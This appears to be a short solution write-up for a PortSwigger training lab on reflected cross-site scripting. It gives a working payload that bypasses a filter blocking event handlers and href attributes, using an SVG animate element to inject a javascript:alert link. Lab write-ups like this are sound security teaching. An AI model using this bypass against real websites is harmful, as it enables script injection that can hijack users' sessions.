Reflected XSS with event handlers and href attributes blocked

----
### Lab description

This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked..

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

`<a href="">Click me</a>`

#### Lab solution

- Verify the context of XSS
![](/static/img/Pasted_image_20230614175654.png)

- Insert the payload `https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
`
![](/static/img/Pasted_image_20230614175841.png)

- Lab Solved.